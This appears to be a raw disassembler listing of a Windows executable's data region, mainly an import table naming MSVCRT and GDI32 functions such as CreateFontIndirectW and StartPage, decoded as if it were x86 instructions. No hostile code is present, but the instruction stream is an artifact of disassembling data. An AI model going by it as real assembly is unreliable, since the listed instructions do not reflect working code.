  42651c:	ins    DWORD PTR es:[edi],dx
  42651d:	outs   dx,DWORD PTR ds:[esi]
  42651e:	fs add BYTE PTR gs:[eax],al
  426522:	fild   DWORD PTR [eax]
  426524:	pop    edi
  426525:	popa   
  426526:	ins    DWORD PTR es:[edi],dx
  426527:	jae    0x426590
  426529:	pop    edi
  42652a:	gs js  0x426596
  42652d:	je     0x42652f
  42652f:	add    BYTE PTR [esi+0x6e695f01],al
  426535:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x88006d72
  42653d:	add    esp,DWORD PTR [esi+0x77]
  426540:	jb     0x4265ab
  426542:	je     0x4265a9
  426544:	add    BYTE PTR [eax],al
  426546:	sahf   
  426547:	add    DWORD PTR [edi+0x69],ebx
  42654a:	jae    0x4265b9
  42654c:	bound  esp,QWORD PTR [edx+0x6c]
  42654f:	gs popa 
  426551:	add    BYTE PTR fs:[eax],al
  426554:	jge    0x426559
  426556:	data16 jb 0x4265be
  426559:	add    BYTE PTR gs:[eax],al
  42655c:	lds    eax,FWORD PTR [ebx]
  42655e:	jo     0x4265d2
  426560:	imul   ebp,DWORD PTR [esi+0x74],0x9a000066
  426567:	add    ebp,DWORD PTR [ecx+0x73]
  42656a:	ins    BYTE PTR es:[edi],dx
  42656b:	outs   dx,DWORD PTR ds:[esi]
  42656c:	ja     0x4265d3
  42656e:	jb     0x426570
  426570:	stos   DWORD PTR es:[edi],eax
  426571:	add    ebp,DWORD PTR [ecx+0x73]
  426574:	ja     0x4265ee
  426576:	imul   esp,DWORD PTR fs:[edi+0x69],0x3780074
  42657e:	data16 jo 0x4265f6
  426581:	je     0x4265e6
  426583:	add    BYTE PTR [edx+0x0],dl
  426586:	pop    edi
  426587:	pop    eax
  426588:	arpl   WORD PTR [eax+0x74],si
  42658b:	inc    esi
  42658c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3dd0072
  426594:	jae    0x426606
  426596:	jb     0x426601
  426598:	outs   dx,BYTE PTR ds:[esi]
  426599:	je     0x426601
  42659b:	add    BYTE PTR [ecx],cl
  42659d:	add    al,0x74
  42659f:	outs   dx,DWORD PTR ds:[esi]
  4265a0:	ins    BYTE PTR es:[edi],dx
  4265a1:	outs   dx,DWORD PTR ds:[esi]
  4265a2:	ja     0x426609
  4265a4:	jb     0x4265a6
  4265a6:	and    eax,DWORD PTR [ecx]
  4265a8:	pop    edi
  4265a9:	gs js  0x426615
  4265ac:	je     0x4265ae
  4265ae:	add    eax,DWORD PTR [ebx+esi*2]
  4265b1:	jns    0x426626
  4265b3:	je     0x42661a
  4265b5:	ins    DWORD PTR es:[edi],dx
  4265b6:	add    BYTE PTR [eax],al
  4265b8:	call   0x65a5c4bd
  4265bd:	js     0x426628
  4265bf:	je     0x4265c1
  4265c1:	add    BYTE PTR ds:0x73637704,dh
  4265c7:	je     0x426638
  4265c9:	ins    BYTE PTR es:[edi],dx
  4265ca:	add    BYTE PTR [eax],al
  4265cc:	iret   
  4265cd:	add    esi,DWORD PTR [edx+0x61]
  4265d0:	outs   dx,BYTE PTR ds:[esi]
  4265d1:	add    BYTE PTR fs:[eax],al
  4265d4:	mov    ch,0x0
  4265d6:	pop    edi
  4265d7:	pop    edi
  4265d8:	jae    0x42663f
  4265da:	je     0x426651
  4265dc:	jae    0x426643
  4265de:	jb     0x42664d
  4265e0:	popa   
  4265e1:	je     0x42664b
  4265e3:	gs jb  0x426658
  4265e6:	add    BYTE PTR [eax],al
  4265e8:	and    eax,DWORD PTR [edi+esi*2]
  4265eb:	arpl   WORD PTR [ebx+0x63],si
  4265ee:	jae    0x426660
  4265f0:	outs   dx,BYTE PTR ds:[esi]
  4265f1:	add    ch,bh
  4265f3:	add    esi,DWORD PTR [ebx+0x74]
  4265f6:	jb     0x42666c
  4265f8:	outs   dx,DWORD PTR ds:[esi]
  4265f9:	jne    0x426667
  4265fb:	add    BYTE PTR [esp+eax*1],ch
  4265fe:	ja     0x426663
  426600:	jae    0x426672
  426602:	bound  esi,QWORD PTR [edx+0x6b]
  426605:	add    BYTE PTR [eax+0x3],ah
  426608:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  42660c:	imul   eax,DWORD PTR [eax],0xffffff85
  42660f:	add    esp,DWORD PTR [esi+0x74]
  426612:	gs ins BYTE PTR es:[edi],dx
  426614:	ins    BYTE PTR es:[edi],dx
  426615:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  42661c:	outs   dx,BYTE PTR ds:[esi]
  42661d:	jne    0x42668c
  42661f:	add    ch,ah
  426621:	add    esi,DWORD PTR [ebx+0x74]
  426624:	jb     0x426689
  426626:	push   0xfc000072
  42662b:	add    esi,DWORD PTR [ebx+0x74]
  42662e:	jb     0x4266a4
  426630:	outs   dx,DWORD PTR ds:[esi]
  426631:	ins    BYTE PTR es:[edi],dx
  426632:	add    BYTE PTR [eax],al
  426634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426635:	add    ebp,DWORD PTR [ecx+0x73]
  426638:	ja     0x42669e
  42663a:	imul   esp,DWORD PTR [edi+0x69],0xeb000074
  426641:	add    esi,DWORD PTR [ebx+0x74]
  426644:	jb     0x4266ab
  426646:	jb     0x4266ba
  426648:	outs   dx,DWORD PTR ds:[esi]
  426649:	jb     0x42664b
  42664b:	add    BYTE PTR [ecx+0x74626d03],bh
  426651:	outs   dx,DWORD PTR ds:[esi]
  426652:	ja     0x4266b7
  426654:	add    BYTE PTR [eax],al
  426656:	push   es
  426657:	add    al,0x74
  426659:	imul   ebp,DWORD PTR [ebp+0x65],0x720000
  426660:	pop    edi
  426661:	pop    edi
  426662:	addr16 gs je 0x4266d3
  426666:	popa   
  426667:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  42666e:	and    DWORD PTR [edi+esi*2],eax
  426671:	arpl   WORD PTR [ebx+0x63],si
  426674:	jo     0x4266ef
  426676:	add    BYTE PTR [eax],al
  426678:	xchg   ebp,eax
  426679:	add    ebp,DWORD PTR [ecx+0x73]
  42667c:	popa   
  42667d:	ins    BYTE PTR es:[edi],dx
  42667e:	jo     0x4266e8
  426680:	popa   
  426681:	add    BYTE PTR [esi],dl
  426683:	add    al,0x76
  426685:	jae    0x4266f7
  426687:	jb     0x4266f2
  426689:	outs   dx,BYTE PTR ds:[esi]
  42668a:	je     0x4266f2
  42668c:	add    BYTE PTR [eax],al
  42668e:	dec    ebp
  42668f:	push   ebx
  426690:	push   esi
  426691:	inc    ebx
  426692:	push   edx
  426693:	push   esp
  426694:	cs fs ins BYTE PTR es:[edi],dx
  426697:	ins    BYTE PTR es:[edi],dx
  426698:	add    BYTE PTR [eax],al
  42669a:	xchg   DWORD PTR [eax],eax
  42669c:	inc    ebx
  42669d:	jb     0x426704
  42669f:	popa   
  4266a0:	je     0x426707
  4266a2:	inc    edx
  4266a3:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc1000070
  4266ab:	add    DWORD PTR [edx+0x65],edx
  4266ae:	ins    DWORD PTR es:[edi],dx
  4266af:	outs   dx,DWORD PTR ds:[esi]
  4266b0:	jbe    0x426717
  4266b2:	inc    esi
  4266b3:	outs   dx,DWORD PTR ds:[esi]
  4266b4:	outs   dx,BYTE PTR ds:[esi]
  4266b5:	je     0x426709
  4266b7:	gs jae 0x426729
  4266ba:	jne    0x42672e
  4266bc:	arpl   WORD PTR [ebp+0x57],sp
  4266bf:	add    BYTE PTR [edi],bh
  4266c1:	add    DWORD PTR [edi+0x65],eax
  4266c4:	je     0x42670a
  4266c6:	dec    ecx
  4266c7:	inc    edx
  4266c8:	inc    ebx
  4266c9:	outs   dx,DWORD PTR ds:[esi]
  4266ca:	ins    BYTE PTR es:[edi],dx
  4266cb:	outs   dx,DWORD PTR ds:[esi]
  4266cc:	jb     0x426722
  4266ce:	popa   
  4266cf:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4266d3:	add    BYTE PTR [esi+0x1],ch
  4266d6:	inc    edi
  4266d7:	gs je  0x42672a
  4266da:	imul   edi,DWORD PTR [eax+0x65],0xb900006c
  4266e1:	add    DWORD PTR [edx+0x65],edx
  4266e4:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  4266e8:	push   edx
  4266e9:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x13a0000
  4266f2:	inc    edi
  4266f3:	gs je  0x426739
  4266f6:	jne    0x42676a
  4266f8:	jb     0x42675f
  4266fa:	outs   dx,BYTE PTR ds:[esi]
  4266fb:	je     0x42674c
  4266fd:	bound  ebp,QWORD PTR [edx+0x65]
  426700:	arpl   WORD PTR [eax+eax*1+0x0],si
  426704:	test   DWORD PTR [ecx],eax
  426706:	inc    edi
  426707:	gs je  0x42675e
  42670a:	gs js  0x426781
  42670d:	inc    ebp
  42670e:	js     0x426784
  426710:	outs   dx,BYTE PTR gs:[esi]
  426712:	je     0x426764
  426714:	outs   dx,DWORD PTR ds:[esi]
  426715:	imul   ebp,DWORD PTR [esi+0x74],0xab0041
  42671c:	inc    ebx
  42671d:	jb     0x426784
  42671f:	popa   
  426720:	je     0x426787
  426722:	push   edx
  426723:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  426728:	outs   dx,BYTE PTR ds:[esi]
  426729:	add    BYTE PTR [ecx+eax*1+0x42746150],ah
  426730:	ins    BYTE PTR es:[edi],dx
  426731:	je     0x426733
  426733:	add    BYTE PTR [ebx+0x74654701],cl
  426739:	push   esp
  42673a:	gs js  0x4267b1
  42673d:	dec    ebp
  42673e:	gs je  0x4267b3
  426741:	imul   esp,DWORD PTR [ebx+0x73],0xb10057
  426748:	inc    esp
  426749:	push   eax
  42674a:	je     0x4267bb
  42674c:	dec    esp
  42674d:	push   eax
  42674e:	add    BYTE PTR [eax],al
  426750:	popf   
  426751:	add    BYTE PTR [ebx+0x72],al
  426754:	gs popa 
  426756:	je     0x4267bd
  426758:	inc    esi
  426759:	outs   dx,DWORD PTR ds:[esi]
  42675a:	outs   dx,BYTE PTR ds:[esi]
  42675b:	je     0x4267a6
  42675d:	outs   dx,BYTE PTR ds:[esi]
  42675e:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  426766:	aad    0x1
  426768:	push   ebx
  426769:	gs je  0x4267ae
  42676c:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  426770:	add    BYTE PTR gs:[esi+0x646e4500],bh
  426777:	inc    esp
  426778:	outs   dx,DWORD PTR ds:[esi]
  426779:	arpl   WORD PTR [eax],ax
  42677b:	add    bh,dl
  42677d:	add    BYTE PTR [esi+0x69],al
  426780:	ins    BYTE PTR es:[edi],dx
  426781:	ins    BYTE PTR es:[edi],dx
  426782:	push   edx
  426783:	outs   dx,BYTE PTR ds:[si]
  426785:	add    BYTE PTR [ecx],al
  426787:	add    dl,BYTE PTR [ebx+0x65]
  42678a:	je     0x4267e3
  42678c:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  426793:	addr16 inc ebp
  426795:	js     0x426797
  426797:	add    ch,al
  426799:	add    DWORD PTR [edx+0x65],edx
  42679c:	jae    0x426812
  42679e:	outs   dx,DWORD PTR ds:[esi]
  42679f:	jb     0x426806
  4267a1:	inc    esp
  4267a2:	inc    ebx
  4267a3:	add    BYTE PTR [eax+0x65724300],ah
  4267a9:	popa   
  4267aa:	je     0x426811
  4267ac:	dec    eax
  4267ad:	popa   
  4267ae:	je     0x426813
  4267b0:	push   0x73757242
  4267b5:	push   0x1d00000
  4267ba:	push   ebx
  4267bb:	gs je  0x4267ff
  4267be:	bound  ebp,QWORD PTR [edi+0x72]
  4267c1:	je     0x426813
  4267c3:	jb     0x426834
  4267c5:	arpl   WORD PTR [eax],ax
  4267c7:	add    BYTE PTR [edi+0x1],bl
  4267ca:	inc    edi
  4267cb:	gs je  0x42681b
  4267ce:	popa   
  4267cf:	jo     0x42681e
  4267d1:	outs   dx,DWORD PTR ds:[esi]
  4267d2:	fs add BYTE PTR gs:[eax],al
  4267d6:	test   BYTE PTR [ecx],0x53
  4267d9:	gs je  0x42682f
  4267dc:	je     0x426850
  4267de:	gs je  0x426844
  4267e1:	push   0x4d746c42
  4267e6:	outs   dx,DWORD PTR ds:[esi]
  4267e7:	fs add BYTE PTR gs:[esi+0x1],dh
  4267ec:	inc    edi
  4267ed:	gs je  0x426842
  4267f0:	outs   dx,BYTE PTR ds:[si]
  4267f2:	inc    edx
  4267f3:	outs   dx,DWORD PTR ds:[esi]
  4267f4:	js     0x4267f6
  4267f6:	stos   BYTE PTR es:[edi],al
  4267f7:	add    BYTE PTR [ebx+0x72],al
  4267fa:	gs popa 
  4267fc:	je     0x426863
  4267fe:	push   eax
  4267ff:	outs   dx,DWORD PTR ds:[esi]
  426800:	ins    BYTE PTR es:[edi],dx
  426801:	jns    0x42686a
  426803:	outs   dx,DWORD PTR ds:[esi]
  426804:	outs   dx,BYTE PTR ds:[esi]
  426805:	push   edx
  426806:	outs   dx,BYTE PTR ds:[si]
  426808:	add    BYTE PTR [eax],al
  42680a:	mov    DWORD PTR [ecx],0x65766153
  426810:	inc    esp
  426811:	inc    ebx
  426812:	add    BYTE PTR [eax],al
  426814:	sahf   
  426815:	add    BYTE PTR [ebx+0x72],al
  426818:	gs popa 
  42681a:	je     0x426881
  42681c:	inc    esi
  42681d:	outs   dx,DWORD PTR ds:[esi]
  42681e:	outs   dx,BYTE PTR ds:[esi]
  42681f:	je     0x426878
  426821:	add    BYTE PTR [edi+0x646e4500],bh
  426827:	push   eax
  426828:	popa   
  426829:	addr16 gs add ch,bl
  42682d:	add    DWORD PTR [ebx+0x65],edx
  426830:	je     0x426876
  426832:	dec    ecx
  426833:	inc    edx
  426834:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x64410070
  42683c:	fs inc esi
  42683e:	outs   dx,DWORD PTR ds:[esi]
  42683f:	outs   dx,BYTE PTR ds:[esi]
  426840:	je     0x426894
  426842:	gs jae 0x4268b4
  426845:	jne    0x4268b9
  426847:	arpl   WORD PTR [ebp+0x57],sp
  42684a:	add    BYTE PTR [eax],al
  42684c:	xchg   ebp,eax
  42684d:	add    DWORD PTR [eax+edx*2+0x74],ecx
  426851:	outs   dx,DWORD PTR ds:[esi]
  426852:	inc    esp
  426853:	push   eax
  426854:	add    BYTE PTR [eax],al
  426856:	mov    DWORD PTR [eax],eax
  426858:	inc    ebx
  426859:	jb     0x4268c0
  42685b:	popa   
  42685c:	je     0x4268c3
  42685e:	inc    edx
  42685f:	jb     0x4268d6
  426861:	jae    0x4268cb
  426863:	dec    ecx
  426864:	outs   dx,BYTE PTR ds:[esi]
  426865:	imul   esi,DWORD PTR fs:[edx+0x65],0x5c007463
  42686d:	add    DWORD PTR [edi+0x65],eax
  426870:	je     0x4268be
  426872:	popa   
  426873:	jns    0x4268e4
  426875:	jne    0x4268eb
  426877:	add    BYTE PTR [ebx+0x1],bh
  42687a:	inc    edi
  42687b:	gs je  0x4268d2
  42687e:	gs js  0x4268f5
  426881:	inc    ecx
  426882:	ins    BYTE PTR es:[edi],dx
  426883:	imul   esp,DWORD PTR [edi+0x6e],0x18a0000
  42688a:	inc    edi
  42688b:	gs je  0x4268e2
  42688e:	gs js  0x426905
  426891:	dec    ebp
  426892:	gs je  0x426907
  426895:	imul   esp,DWORD PTR [ebx+0x73],0x1ba0041
  42689c:	push   edx
  42689d:	arpl   WORD PTR gs:[esi+edx*2+0x69],si
  4268a2:	jae    0x42690d
  4268a4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4268a8:	cli    
  4268a9:	add    DWORD PTR [ebx+0x65],edx
  4268ac:	je     0x426902
  4268ae:	gs js  0x426925
  4268b1:	inc    ebx
  4268b2:	outs   dx,DWORD PTR ds:[esi]
  4268b3:	ins    BYTE PTR es:[edi],dx
  4268b4:	outs   dx,DWORD PTR ds:[esi]
  4268b5:	jb     0x4268b7
  4268b7:	add    BYTE PTR [eax+0x1],al
  4268ba:	inc    edi
  4268bb:	gs je  0x426902
  4268be:	dec    ecx
  4268bf:	inc    edx
  4268c0:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x74530205
  4268c8:	popa   
  4268c9:	jb     0x42693f
  4268cb:	push   eax
  4268cc:	popa   
  4268cd:	add    BYTE PTR gs:[bp+si+0x4300],dl
  4268d3:	jb     0x42693a
  4268d5:	popa   
  4268d6:	je     0x42693d
  4268d8:	inc    esp
  4268d9:	dec    ecx
  4268da:	inc    edx
  4268db:	push   ebx
  4268dc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4268e1:	outs   dx,BYTE PTR ds:[esi]
  4268e2:	add    BYTE PTR [eax],al
  4268e4:	rol    BYTE PTR [eax],0x45
  4268e7:	outs   dx,BYTE PTR ds:[esi]
  4268e8:	fs push eax
  4268ea:	popa   
  4268eb:	je     0x426955
  4268ed:	add    BYTE PTR [eax+0x65724300],cl
  4268f3:	popa   
  4268f4:	je     0x42695b
  4268f6:	inc    edx
  4268f7:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  4268ff:	imul   esi,DWORD PTR [edx+0x65],0x7463
  426906:	test   BYTE PTR [ecx],al
  426908:	inc    edi
  426909:	gs je  0x426960
  42690c:	gs js  0x426983
  42690f:	inc    ebp
  426910:	js     0x426986
  426912:	outs   dx,BYTE PTR gs:[esi]
  426914:	je     0x426966
  426916:	outs   dx,DWORD PTR ds:[esi]
  426917:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  42691e:	mov    ebx,0x63655201
  426923:	je     0x426986
  426925:	outs   dx,BYTE PTR ds:[esi]
  426926:	ins    BYTE PTR es:[di],dx
  426928:	add    BYTE PTR gs:[ebp+0x74615001],ah
  42692f:	push   0x65526f54
  426934:	imul   ebp,DWORD PTR [bx+0x6e],0x1690000
  42693c:	inc    edi
  42693d:	gs je  0x42698f
  426940:	bound  ebp,QWORD PTR [edx+0x65]
  426943:	arpl   WORD PTR [edi+edx*2+0x0],si
  426947:	add    BYTE PTR [edi+0x44],al
  42694a:	dec    ecx
  42694b:	xor    esi,DWORD PTR [edx]
  42694d:	cs fs ins BYTE PTR es:[edi],dx
  426950:	ins    BYTE PTR es:[edi],dx
  426951:	add    BYTE PTR [ebx+0x68],ch
  426954:	pop    edx
  426955:	jp     0x4269c9
  426957:	jp     0x4269cd
  426959:	push   ebx
  42695a:	and    ch,BYTE PTR [ebp+0x42]
  42695d:	add    BYTE PTR [edx],ch
  42695f:	ins    DWORD PTR es:[edi],dx
  426960:	inc    edx
  426961:	add    BYTE PTR [edx-0x10ffbd95],ah
  426967:	or     esi,DWORD PTR [edx+0x324f7d0e]
  42696d:	dec    edi
  42696e:	addr16 dec edi
  426970:	xor    DWORD PTR [edi+0x4f],ecx
  426973:	dec    edi
  426974:	cmp    al,0x4f
  426976:	jp     0x4269c7
  426978:	cmp    ecx,DWORD PTR [edi+0x5e]
  42697b:	dec    edi
  42697c:	es dec edi
  42697e:	jae    0x4269cf
  426980:	and    eax,0x224f324f
  426985:	dec    edi
  426986:	push   ds
  426987:	push   edx
  426988:	pop    ds
  426989:	push   ebx
  42698a:	cmp    eax,0x324f7d4f
  42698f:	dec    edi
  426990:	addr16 dec edi
  426992:	xor    DWORD PTR [edi+0x4f],ecx
  426995:	dec    edi
  426996:	cmp    al,0x4f
  426998:	jp     0x4269e9
  42699a:	cmp    ecx,DWORD PTR [edi+0x5e]
  42699d:	dec    edi
  42699e:	es dec edi
  4269a0:	ins    DWORD PTR es:[edi],dx
  4269a1:	dec    edi
  4269a2:	and    eax,0x224f324f
  4269a7:	dec    edi
  4269a8:	push   ds
  4269a9:	bound  ebx,QWORD PTR [edi]
  4269ab:	arpl   WORD PTR ds:0x324f7d4f,di
  4269b1:	dec    edi
  4269b2:	bound  ecx,QWORD PTR [edi+0x31]
  4269b5:	dec    edi
  4269b6:	jae    0x426a07
  4269b8:	cmp    eax,0x384f404f
  4269bd:	dec    edi
  4269be:	xor    cl,BYTE PTR [edi+0x24]
  4269c1:	dec    edi
  4269c2:	push   ds
  4269c3:	jb     0x4269e4
  4269c5:	jae    0x4269d6
  4269c7:	or     DWORD PTR [eax+eax*4],0x7c
  4269cb:	nop
  4269cc:	jge    0x42695f
  4269ce:	aas    
  4269cf:	dec    edi
  4269d0:	dec    di
  4269d2:	xor    cl,BYTE PTR [edi+0x66]
  4269d5:	dec    edi
  4269d6:	ds dec edi
  4269d8:	inc    eax
  4269d9:	dec    edi
  4269da:	cmp    eax,0x394f734f
  4269df:	dec    edi
  4269e0:	xor    cl,BYTE PTR [edi+0x26]
  4269e3:	dec    edi
  4269e4:	push   ds
  4269e5:	sbb    BYTE PTR [edi],0x83
  4269e8:	setae  BYTE PTR [eax+edx*4]
  4269ec:	jl     0x42698e
  4269ee:	jge    0x426991
  4269f0:	aas    
  4269f1:	dec    edi
  4269f2:	dec    di
  4269f4:	xor    cl,BYTE PTR [edi+0x66]
  4269f7:	dec    edi
  4269f8:	ds dec edi
  4269fa:	inc    eax
  4269fb:	dec    edi
  4269fc:	cmp    eax,0x394f6d4f
  426a01:	dec    edi
  426a02:	xor    cl,BYTE PTR [edi+0x26]
  426a05:	dec    edi
  426a06:	push   ds
  426a07:	xchg   edx,eax
  426a08:	pop    ds
  426a09:	xchg   ebx,eax
  426a0a:	bt     DWORD PTR [eax+eiz*4],ecx
  426a0e:	jl     0x4269c0
  426a10:	jge    0x4269c3
  426a12:	aas    
  426a13:	dec    edi
  426a14:	ins    BYTE PTR es:[edi],dx
  426a15:	dec    edi
  426a16:	xor    cl,BYTE PTR [edi+0x4e]
  426a19:	dec    edi
  426a1a:	xor    DWORD PTR [edi+0x73],ecx
  426a1d:	dec    edi
  426a1e:	cmp    eax,0x384f454f
  426a23:	dec    edi
  426a24:	xor    cl,BYTE PTR [edi+0x26]
  426a27:	dec    edi
  426a28:	push   ds
  426a29:	mov    ds:0xb30fa31f,al
  426a2e:	or     al,0xb0
  426a30:	jl     0x4269f2
  426a32:	jge    0x4269f5
  426a34:	aas    
  426a35:	dec    edi
  426a36:	ins    BYTE PTR es:[edi],dx
  426a37:	dec    edi
  426a38:	xor    cl,BYTE PTR [edi+0x4e]
  426a3b:	dec    edi
  426a3c:	xor    DWORD PTR [edi+0x7c],ecx
  426a3f:	dec    edi
  426a40:	cmp    eax,0x3b4f5f4f
  426a45:	dec    edi
  426a46:	xor    cl,BYTE PTR [edi+0x39]
  426a49:	dec    edi
  426a4a:	push   ds
  426a4b:	mov    dl,0x1f
  426a4d:	mov    bl,0xf
  426a4f:	ret    
  426a50:	or     al,0xc0
  426a52:	jl     0x426a24
  426a54:	jge    0x426a27
  426a56:	aas    
  426a57:	dec    edi
  426a58:	ins    BYTE PTR es:[edi],dx
  426a59:	dec    edi
  426a5a:	xor    cl,BYTE PTR [edi+0x4e]
  426a5d:	dec    edi
  426a5e:	xor    DWORD PTR [edi+0x62],ecx
  426a61:	dec    edi
  426a62:	cmp    eax,0x384f4e4f
  426a67:	dec    edi
  426a68:	xor    cl,BYTE PTR [edi+0x24]
  426a6b:	dec    edi
  426a6c:	push   ds
  426a6d:	ret    0xc31f
  426a70:	psrlq  mm1,QWORD PTR [eax+edx*8]
  426a74:	jl     0x426a56
  426a76:	jge    0x426a59
  426a78:	aas    
  426a79:	dec    edi
  426a7a:	ins    BYTE PTR es:[edi],dx
  426a7b:	dec    edi
  426a7c:	xor    cl,BYTE PTR [edi+0x4e]
  426a7f:	dec    edi
  426a80:	xor    DWORD PTR [edi+0x63],ecx
  426a83:	dec    edi
  426a84:	cmp    eax,0x384f404f
  426a89:	dec    edi
  426a8a:	xor    cl,BYTE PTR [edi+0x26]
  426a8d:	dec    edi
  426a8e:	push   ds
  426a8f:	rcr    BYTE PTR [edi],cl
  426a91:	ror    DWORD PTR [edi],cl
  426a93:	jecxz  0x426aa1
  426a95:	loopne 0x426b13
  426a97:	lock jge 0x426a8b
  426a9a:	aas    
  426a9b:	dec    edi
  426a9c:	popa   
  426a9d:	dec    edi
  426a9e:	xor    cl,BYTE PTR [edi+0x5f]
  426aa1:	dec    edi
  426aa2:	xor    DWORD PTR [edi+0x42],ecx
  426aa5:	dec    edi
  426aa6:	ds dec edi
  426aa8:	xor    cl,BYTE PTR [edi+0x3f]
  426aab:	dec    edi
  426aac:	push   ds
  426aad:	loop   0x426ace
  426aaf:	jecxz  0x426ac0
  426ab1:	repz or al,0xf0
  426ab4:	jl     0x426ab6
  426ab6:	jge    0x426ab9
  426ab8:	jl     0x426aca
  426aba:	jge    0x426acd
  426abc:	ds dec edi
  426abe:	jg     0x426b0f
  426ac0:	xor    cl,BYTE PTR [edi+0x5b]
  426ac3:	dec    edi
  426ac4:	xor    BYTE PTR [edi+0x62],cl
  426ac7:	dec    edi
  426ac8:	ds dec edi
  426aca:	inc    ecx
  426acb:	dec    edi
  426acc:	cmp    ecx,DWORD PTR [edi+0x32]
  426acf:	dec    edi
  426ad0:	cmp    DWORD PTR [edi+0x1e],ecx
  426ad3:	add    bl,BYTE PTR [edi]
  426ad5:	add    ecx,DWORD PTR [edi]
  426ad7:	adc    ecx,DWORD PTR [eax+edx*1]
  426ada:	jl     0x426afc
  426adc:	jge    0x426aff
  426ade:	aas    
  426adf:	dec    edi
  426ae0:	add    BYTE PTR [eax],al
  426ae2:	push   0x69
  426ae4:	inc    edx
  426ae5:	add    BYTE PTR [esi+0x6b],bl
  426ae8:	inc    edx
  426ae9:	add    BYTE PTR [esi+0x6b],ah
  426aec:	inc    edx
  426aed:	add    BYTE PTR [esi],ch
  426aef:	ins    DWORD PTR es:[edi],dx
  426af0:	inc    edx
  426af1:	add    BYTE PTR [edx+0x1e00426c],dl
  426af7:	ins    DWORD PTR es:[edi],dx
  426af8:	inc    edx
  426af9:	add    BYTE PTR [esi+0x6b],al
  426afc:	inc    edx
  426afd:	add    BYTE PTR [edx+0x6b],cl
  426b00:	inc    edx
  426b01:	add    BYTE PTR [esi],dl
  426b03:	ins    DWORD PTR es:[edi],dx
  426b04:	inc    edx
  426b05:	add    BYTE PTR [esi-0x4effbd95],ch
  426b0b:	test   eax,0xbab8f89c
  426b10:	pushf  
  426b11:	clc    
  426b12:	bound  ebp,QWORD PTR [ebx+0x42]
  426b15:	add    BYTE PTR [esi+0x6c],cl
  426b18:	inc    edx
  426b19:	add    BYTE PTR [edx+0x6c],ah
  426b1c:	inc    edx
  426b1d:	add    BYTE PTR [esi+0x6c],ch
  426b20:	inc    edx
  426b21:	add    BYTE PTR [esi+0x6c],bh
  426b24:	inc    edx
  426b25:	add    BYTE PTR [edx+0x6600426b],bl
  426b2b:	imul   eax,DWORD PTR [edx+0x0],0x426bba
  426b32:	stos   BYTE PTR es:[edi],al
  426b33:	imul   eax,DWORD PTR [edx+0x0],0x32
  426b37:	ins    DWORD PTR es:[edi],dx
  426b38:	inc    edx
  426b39:	add    BYTE PTR [eax],bh
  426b3b:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  426b42:	outs   dx,BYTE PTR ds:[esi]
  426b43:	imul   eax,DWORD PTR [edx+0x0],0xffffff9a
  426b47:	sbb    al,0x16
  426b49:	or     DWORD PTR [esi+0x7050d],0x3a004000
  426b53:	call   0xa3184a93
  426b58:	inc    edx
  426b59:	add    BYTE PTR [ebx+0x65],al
  426b5c:	addr16 inc esp
  426b5e:	mov    ?,edx
  426b60:	jne    0x426bc4
  426b62:	mov    gs,ebp
  426b64:	inc    BYTE PTR [edi]
  426b66:	mov    edi,0x5605a3fa
  426b6b:	imul   eax,DWORD PTR [edx+0x0],0x39
  426b6f:	xchg   ebp,eax
  426b70:	pushf  
  426b71:	clc    
  426b72:	cmp    DWORD PTR [esi-0x6ac50764],edx
  426b78:	pushf  
  426b79:	clc    
  426b7a:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  426b80:	pushf  
  426b81:	clc    
  426b82:	cmp    eax,0x3ef89c95
  426b87:	xchg   ebp,eax
  426b88:	pushf  
  426b89:	clc    
  426b8a:	aas    
  426b8b:	xchg   ebp,eax
  426b8c:	pushf  
  426b8d:	clc    
  426b8e:	and    BYTE PTR [ebp-0x6ade0764],dl
  426b94:	pushf  
  426b95:	clc    
  426b96:	sub    BYTE PTR [ebp-0x6130764],dl
  426b9c:	add    esp,DWORD PTR [eax+0x5e]
  426b9f:	imul   eax,DWORD PTR [edx+0x0],0x426daa
  426ba6:	push   edi
  426ba7:	dec    edx
  426ba8:	ins    BYTE PTR es:[edi],dx
  426ba9:	popa   
  426baa:	cmp    BYTE PTR [ebp-0x16620764],al
  426bb0:	push   eax
  426bb1:	pop    es
  426bb2:	lds    eax,FWORD PTR [esi]
  426bb4:	add    BYTE PTR [eax],al
  426bb6:	pop    edx
  426bb7:	imul   eax,DWORD PTR [edx+0x0],0xe040b9b
	...
  426bee:	or     eax,0xce004236
  426bf3:	jge    0x426c37
  426bf5:	add    BYTE PTR [eax],al
  426bf7:	add    BYTE PTR [eax],al
  426bf9:	add    BYTE PTR [eax+eax*1+0x4a],al
  426bfd:	add    BYTE PTR [ebx+0x0],cl
  426c00:	push   ebp
  426c01:	add    BYTE PTR [ebx+0x0],ch
  426c04:	ins    BYTE PTR es:[edi],dx
  426c05:	add    BYTE PTR [edx+0x0],ch
  426c08:	inc    esp
  426c09:	add    BYTE PTR [edx+0x0],cl
  426c0c:	dec    ebx
  426c0d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  426c11:	add    BYTE PTR [edx+0x0],cl
  426c14:	inc    esp
  426c15:	add    BYTE PTR [ebp+0x0],dl
  426c18:	dec    ecx
  426c19:	add    BYTE PTR [eax+eax*1+0x4c],al
  426c1d:	add    BYTE PTR [eax+eax*1+0x4a],cl
  426c21:	add    BYTE PTR [ebx+0x0],cl
  426c24:	inc    esp
